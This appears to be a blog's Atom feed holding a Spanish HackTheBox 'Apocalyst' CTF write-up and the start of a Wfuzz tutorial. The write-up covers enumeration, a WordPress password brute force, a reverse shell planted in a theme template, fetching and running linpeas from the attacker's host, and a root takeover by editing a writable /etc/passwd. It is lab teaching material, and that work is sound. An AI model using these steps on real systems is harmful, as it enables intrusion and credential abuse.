<?xml version="1.0" encoding="utf-8"?><?xml-stylesheet type="text/xml" href="https://th4nuno.github.io/feed.xslt.xml"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.2.1">Jekyll</generator><link href="https://th4nuno.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://th4nuno.github.io/" rel="alternate" type="text/html" /><updated>2022-02-24T11:39:16-03:00</updated><id>https://th4nuno.github.io/</id><title type="html">Th4Nuno</title><subtitle>Moon is a minimal, one column jekyll theme for your blog.</subtitle><entry><title type="html">Apocalyst Writeup HackTheBox</title><link href="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/" rel="alternate" type="text/html" title="Apocalyst Writeup HackTheBox" /><published>2022-02-22T00:00:00-03:00</published><updated>2022-02-22T00:00:00-03:00</updated><id>https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox</id><content type="html" xml:base="https://th4nuno.github.io/Apocalyst-Writeup-HackTheBox/">&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;

&lt;p&gt;Comenzamos con esta etapa usando una herramienta de escaneo de puertos muy conocida llamada &lt;em&gt;nmap&lt;/em&gt;. Primero haremos un escaneo simple para encontrar los puertos abiertos y luego buscaremos más detalle en los encontrados.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -p- --open -v -T5 -sS -n -Pn 10.10.10.46 -oG allPorts&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Para realizar un escaneo del rango completo de puertos por TCP (0-65535) y mostrar solamente los abiertos usamos los parámetros &lt;em&gt;-p-&lt;/em&gt; y &lt;em&gt;–open&lt;/em&gt;. También agregamos &lt;em&gt;-v&lt;/em&gt; para irnos mostrando la información que nmap encuentre. Ahora, este escaneo puede llevar mucho tiempo. Para más rapidez, como estamos en un ambiente controlado en el que podemos hacer pruebas sin ningun tipo de problema, vamos a utilizar el nivel mas rápido que trae esta herramienta, especificando el parámetro &lt;em&gt;-T5&lt;/em&gt;, además de simplicar el escaneo con un SYN scan (&lt;em&gt;-sS&lt;/em&gt;), sin resolución DNS (&lt;em&gt;-n&lt;/em&gt;) y sin host discovery (&lt;em&gt;-Pn&lt;/em&gt;). Tambien lo voy a exportar en formato grepeable para obtener los puertos de una forma rápida con &lt;a href=&quot;https://pastebin.com/tYpwpauW&quot;&gt;extractPorts&lt;/a&gt;, una función en bash que tengo añadida a mi terminal.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;-Pn&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;. All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-22 11:56 -03
Initiating SYN Stealth Scan at 11:56
Scanning 10.10.10.46 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
Discovered open port 80/tcp on 10.10.10.46
Discovered open port 22/tcp on 10.10.10.46
SYN Stealth Scan Timing: About 37.29% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;; ETC: 11:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:52 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Completed SYN Stealth Scan at 11:57, 73.13s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.24s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;73.24 seconds
           Raw packets sent: 69344 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.051MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 69344 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.774MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Nmap nos muestra que los únicos puertos que están abiertos son el 22 (SSH) y el 80 (HTTP). Ahora vamos a tomar estos puertos y realizar un escaneo para intentar obtener sus versiones y enumerar los servicios con los scripts de nmap (&lt;em&gt;-sCV&lt;/em&gt;)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -sCV -p 22,80 10.10.10.46 -oN targeted&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-02-22 13:36 -03
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 fd:ab:0f:c9:22:d5:f4:8f:7a:0a:29:11:b4:04:da:c9 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 76:92:39:0a:57:bd:f0:03:26:78:c7:db:1a:66:a5:bc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 12:12:cf:f1:7f:be:43:1f:d5:e6:6d:90:84:25:c8:bd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-generator: WordPress 4.8
|_http-title: Apocalypse Preparation Blog
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;14.08 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;

&lt;p&gt;Ahora que tenemos mas información, sabemos especificamente sus versiones y además, con el script de nmap &lt;em&gt;http-generator&lt;/em&gt; vemos que el sitio web tiene de CMS un Wordpress. Esto lo podemos confirmar con whatweb:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;whatweb 10.10.10.46&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;http://10.10.10.46 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt;, IP[10.10.10.46], JQuery[1.12.4], MetaGenerator[WordPress 4.8], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Apocalypse Preparation Blog], UncommonHeaders[link], WordPress[4.8]&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Como es un Wordpress usando &lt;strong&gt;wpscan&lt;/strong&gt;, que es una herramienta que podés encontrar &lt;a href=&quot;https://github.com/wpscanteam/wpscan&quot;&gt;acá&lt;/a&gt;, podemos escanear el sitio web en busca de algun fallo del que nos podramos aprovechar. En este caso no es de utilidad, asi que seguimos buscando.&lt;/p&gt;

&lt;p&gt;Si miramos la página web a través de la ip se ve bastante mal. Esto lo podemos solucionar agregando el dominio, colocando la siguiente línea en nuestro &lt;em&gt;/etc/hosts&lt;/em&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;10.10.10.46 apocalyst.htb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Utilizando el script &lt;em&gt;http-enum&lt;/em&gt; de nmap podemos hacer fuzzing con un diccionario muy simple que trae la misma, el cual nos arroja algunos resultados:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap --script&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http-enum -p 80 10.10.10.46 -oN webScan&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.46
  Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.15s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
  
  PORT   STATE SERVICE
  80/tcp open  http
  | http-enum:
  |   /blog/: Blog
  |   /wp-login.php: Possible admin folder
  |   /readme.html: Wordpress version: 2
  |   /: WordPress version: 4.8
  |   /wp-includes/images/rss.png: Wordpress version 2.2 found.
  |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
  |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
  |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
  |   /wp-login.php: Wordpress login page.
  |   /wp-admin/upgrade.php: Wordpress login page.
  |   /readme.html: Interesting, a readme.
  |   /custom/: Potentially interesting folder
  |   /down/: Potentially interesting folder
  |   /good/: Potentially interesting folder
  |   /hidden/: Potentially interesting folder
  |   /idea/: Potentially interesting folder
  |   /info/: Potentially interesting folder
  |   /information/: Potentially interesting folder
  |   /name/: Potentially interesting folder
  |   /page/: Potentially interesting folder
  |   /personal/: Potentially interesting folder
  |   /pictures/: Potentially interesting folder
  |   /site/: Potentially interesting folder
  |  /state/: Potentially interesting folder
  
  &lt;span class=&quot;c&quot;&gt;# Nmap done at Wed Feb 23 09:19:46 2022 -- 1 IP address (1 host up) scanned in 15.31 seconds&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sin contar las páginas de Wordpress por defecto, la mayoría nos resuelven el mismo resultado: una simple imagen.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst1.png&quot; alt=&quot;apocalyst1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esto ya parece un poco raro, vamos a seguir viendo a ver que encontramos.&lt;/p&gt;

&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;

&lt;p&gt;Haciendo fuzzing con la herramienta WFuzz (si no la conocés tengo un articulo &lt;a href=&quot;https://th4nuno.github.io/Aprende-a-Usar-Wfuzz&quot;&gt;acá&lt;/a&gt; en el que te enseño cómo utilizarla) encontramos el mismo resultado reiteradas veces, la misma imagen con la misma cantidad de carácteres, lo que significa que son idénticas. Como la página web es un blog con varios artículos, vamos a hacer uso de Cewl (que viene instalada por defecto en Parrot y Kali Linux), la cuál nos permitirá crear nuestro propio diccionario en base a la url que especifiquemos:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cewl -w wordlist.txt &lt;span class=&quot;s2&quot;&gt;&quot;http://apocalyst.htb/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Con este comando ya habríamos creado el archivo &lt;em&gt;wordlist.txt&lt;/em&gt; así que vamos a incorporarlo a WFuzz, ocultando los resultados que nos arrojen 157 carácteres que devuelven la imagen repetida:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wfuzz -c --hc&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 --hh&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;157 -t 200 -L -u &lt;span class=&quot;s2&quot;&gt;&quot;http://apocalyst.htb/FUZZ&quot;&lt;/span&gt; -w ../content/wordlist.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Wfuzz 3.1.0 - The Web Fuzzer                         &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;********************************************************&lt;/span&gt;

Target: http://apocalyst.htb/FUZZ
Total requests: 532

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000455:   200        14 L     20 W       175 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Rightiousness&quot;&lt;/span&gt;                                                                                                             

Total &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0
Processed Requests: 532
Filtered Requests: 531
Requests/sec.: 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Como ven encontramos solo una página, pero lo que más nos llama la atención es que nos muestra la misma imagen que vimos anteriormente, pero con una cantidad de carácteres diferente. Esto significa que seguramente estamos ante una técnica de &lt;strong&gt;esteganografía&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;esteganografía-en-imágenes&quot;&gt;Esteganografía en Imágenes&lt;/h2&gt;

&lt;p&gt;Esta técnica de criptografía muy conocida nos permite ocultar información dentro de una imagen, pero sin que se vea a simple vista. Esto es lo que nos está pasando seguramente. Todas las imágenes son iguales menos una, que tiene un tamaño diferente (por eso nos devuelve otra cantidad diferente de carácteres). Para analizarla y comprobar si hay un archivo oculto dentro, vamos a utilizar un herramienta llamada &lt;strong&gt;steghide&lt;/strong&gt;. Descargamos la imagen y utilizamos el siguiente comando.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;steghide info image.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image.jpg&quot;&lt;/span&gt;:
  format: jpeg
  capacity: 13.0 KB
Try to get information about embedded data ? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y/n&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; y
Enter passphrase: 
  embedded file &lt;span class=&quot;s2&quot;&gt;&quot;list.txt&quot;&lt;/span&gt;:
    size: 3.6 KB
    encrypted: rijndael-128, cbc
    compressed: yes&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Al ejecutarlo nos pide una contraseña, pero si probamos dejándolo en blanco funciona. Nos muestra que hay un archivo list.txt contenido dentro de la imagen, el cual podemos extraer:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;steghide extract -sf image.jpg&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;El archivo que obtenemos no es más que una simple lista de palabras, pero que podemos utilizar para intentar hacer un bruteforcing.&lt;/p&gt;

&lt;h3 id=&quot;bruteforcing&quot;&gt;Bruteforcing&lt;/h3&gt;

&lt;p&gt;Para esto tenemos que obtener un usuario válido. Esto es muy fácil, ya que si observamos cualquier artículo del sitio web como es un Wordpress nos muestra el usuario que lo creó. Este usuario se llama “falaraki”. Podemos comprobar que es un usuario válido visitando &lt;em&gt;wp-login.php&lt;/em&gt;, colocando un usuario erróneo obtenemos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst2.png&quot; alt=&quot;apocalyst2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Claramente nos dice que lo que está mal es el usuario. Ahora, vamos a ver qué nos muestra si probamos con falaraki:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst3.png&quot; alt=&quot;apocalyst3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos dice otra cosa diferente. Esto es porque Wordpress por defecto diferencia el error de un usuario inválido al de un usuario válido con una contraseña incorrecta. Por lo tanto, vamos a probar de vuelta con &lt;strong&gt;wpscan&lt;/strong&gt; pero ahora realizando un bruteforcing. Para eso vamos a utilizar el siguiente comando, habiendo guardado el usuario dentro de un archivo “user” en el mismo directorio que nuestra lista de contraseñas:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;wpscan --url http://apocalyst.htb/ -U user -P list.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Performing password attack on Wp Login against 1 user/s
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SUCCESS] - falaraki / Transclisiation                                                                                                                                                       
Trying falaraki / total Time: 00:00:21 &amp;lt;&lt;span class=&quot;o&quot;&gt;=============================================&lt;/span&gt;                                                                     &amp;gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;335 / 821&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 40.80%  ETA: ??:??:??

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] Valid Combinations Found:
 | Username: falaraki, Password: Transclisiation&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Excelente! Conseguimos credenciales válidas, ahora toca la parte mas fácil, que es obtener acceso a la máquina.&lt;/p&gt;

&lt;h3 id=&quot;explotando-el-panel-de-wordpress&quot;&gt;Explotando el Panel de Wordpress&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst4.png&quot; alt=&quot;apocalyst4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que estamos dentro del panel de Wordpress, vamos a dirigirnos a &lt;em&gt;Appeareance-&amp;gt;Editor&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://th4nuno.github.io/assets/img/posts/apocalyst/apocalyst5.png&quot; alt=&quot;apocalyst5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Dentro del editor, vamos a abrir el template &lt;em&gt;404.php&lt;/em&gt; que se encuentra a la derecha. Esto nos permite modificar el código PHP del mismo, por lo tanto simplemente añadimos una reverse shell en PHP y guardamos el archivo. Solo falta ponernos en escucha con &lt;strong&gt;netcat&lt;/strong&gt; e irnos a un artículo que no exista. Para ponernos en escucha por el puerto 443 ejecutamos el siguiente comando:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nc -nvlp 443&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Como podemos listar los artículos con &lt;em&gt;?p=x&lt;/em&gt; vamos a cambiarlo a un número que no exista, como por ejemplo &lt;em&gt;?p=10&lt;/em&gt; y obtenemos inmediatamente la shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@apocalyst:/var/www/html/apocalyst.htb$ &lt;/span&gt;whoami
whoami
www-data&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h4 id=&quot;tratamiento-de-la-tty&quot;&gt;Tratamiento de la TTY&lt;/h4&gt;

&lt;p&gt;La shell que tenemos realmente no es tan cómoda, así que para solucionarlo podemos realizar una serie de pasos que siempre son los mismos en una máquina Linux, para poder obtener una shell completamente funcional.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;script /dev/null -c bash
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ctrl-Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
stty raw -echo; &lt;span class=&quot;nb&quot;&gt;fg
	&lt;/span&gt;reset xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Listo. Ahora podemos hacer Ctrl-C sin peligro de que se nos cierre la bash y Ctrl-L para limpiar la terminal.&lt;/p&gt;

&lt;p&gt;Si nos dirigimos a /home/falaraki encontramos el user.txt con la flag. Ahora toca escalar privilegios.&lt;/p&gt;

&lt;h2 id=&quot;escalación-de-privilegios&quot;&gt;Escalación de Privilegios&lt;/h2&gt;

&lt;p&gt;Vamos a descargar en la máquina &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng&quot;&gt;&lt;strong&gt;linPEAS&lt;/strong&gt;&lt;/a&gt;, una utilidad que nos permitirá realizar una gran cantidad de escaneos para encontrar fallas en el sistema. Para traerla decidí crear en mi máquina un servidor en Python en el mismo directorio que tengo el script y descargar el archivo en la shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;En mi máquina&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
python3 -m http.server 80

&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;En la máquina víctima&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /dev/shm
wget http://10.10.14.7/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Como el escaneo devuelve demasiada información voy a colocar sólo un fragmento que me llamó mucho la atención:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;╔══════════╣ Permissions &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;init, init.d, systemd, and rc.d   
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
═╣ Writable passwd file? ................ /etc/passwd is writable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Esto muy pocas veces lo van a ver, pero cuando lo vean ya tienen asegurado el root. Como tenemos permisos para escribir en el passwd podemos acceder como el usuario que queramos. Lo pueden comprobar haciendo un &lt;em&gt;ls&lt;/em&gt;:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ls -la /etc/passwd
-rw-rw-rw- 1 root root 1649 Feb 24 12:25 /etc/passwd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Por defecto los usuarios tienen una x, lo que significa que la contraseña la tomará del /etc/shadow, archivo el cuál no tenemos acceso. Por lo tanto, necesitamos cambiar esa x por un hash, porque el sistema tomará la primera contraseña que encuentre, que será la añadida.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;&amp;gt; &lt;/span&gt;openssl passwd
Password: toor
Verifying - Password: toor
2r5/v3qyIr5jI&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Cambiamos la x de root en el /etc/passwd por este hash y listo:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;www-data@apocalyst:/dev/shm$ &lt;/span&gt;su root
Password: 
&lt;span class=&quot;gp&quot;&gt;root@apocalyst:/dev/shm# &lt;/span&gt;whoami 
root
&lt;span class=&quot;gp&quot;&gt;root@apocalyst:/dev/shm# &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;</content><category term="fuzzing" /><category term="pentesting" /><category term="web" /><category term="cryptography" /><category term="privesc" /><summary type="html">Les traigo el writeup de una máquina de tipo CTF, la cuál tiene una intrusión bastante única y siendo de dificultad media es bastante accesible para los que están empezando en el mundo del pentesting</summary></entry><entry><title type="html">Aprende a Usar Wfuzz</title><link href="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/" rel="alternate" type="text/html" title="Aprende a Usar Wfuzz" /><published>2022-02-06T00:00:00-03:00</published><updated>2022-02-06T00:00:00-03:00</updated><id>https://th4nuno.github.io/Aprende-a-Usar-Wfuzz</id><content type="html" xml:base="https://th4nuno.github.io/Aprende-a-Usar-Wfuzz/">&lt;h1 id=&quot;qué-es-wfuzz&quot;&gt;¿Qué es Wfuzz?&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;Wfuzz&lt;/strong&gt; es una herramienta que nos permite hacer &lt;strong&gt;fuzzing&lt;/strong&gt; a una página web, reemplazando la palabra clave &lt;strong&gt;FUZZ&lt;/strong&gt; con un tipo de &lt;strong&gt;payload&lt;/strong&gt;, que puede ser una lista de directorios, un rango de números, entre otras más opciones. Tambien nos permite hacer un escaneo recursivo, seguir las redirecciones para obtener el código de estado final y más cosas que las iremos viendo en este post.&lt;/p&gt;

&lt;h1 id=&quot;como-instalar-wfuzz&quot;&gt;Como Instalar Wfuzz&lt;/h1&gt;

&lt;h4 id=&quot;muy-lindo-todo-pero-como-instalo-wfuzz&quot;&gt;Muy lindo todo, pero… ¿Como instalo Wfuzz?&lt;/h4&gt;

&lt;p&gt;Depende de en que sistema operativo te encuentres. Lo que yo recomiendo es que si querés hacer pentesting te instales Kali Linux o Parrot (yo utilizo Parrot), que son sistemas especializados en Hacking Ético que traen por defecto una gran cantidad de herramientas, entre ellas Wfuzz.&lt;/p&gt;

&lt;p&gt;De forma alternativa, se puede descargar fácilmente haciendo uso del siguiente comando (teniendo Python instalado):&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;pip install wfuzz&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h1 id=&quot;como-usar-wfuzz&quot;&gt;Como Usar Wfuzz&lt;/h1&gt;

&lt;h2 id=&quot;fuzzing-con-diccionarios&quot;&gt;Fuzzing con Diccionarios&lt;/h2&gt;

